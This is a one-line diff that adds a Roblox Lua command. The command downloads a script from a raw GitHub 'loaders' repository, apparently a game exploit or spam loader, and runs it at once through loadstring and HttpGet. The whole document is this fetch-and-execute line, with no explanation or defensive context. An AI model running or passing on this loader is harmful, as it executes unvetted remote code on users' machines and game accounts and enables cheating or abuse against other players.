@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/catch-the-artist-spam7-ose9r2drgzzz5j.lua"))()
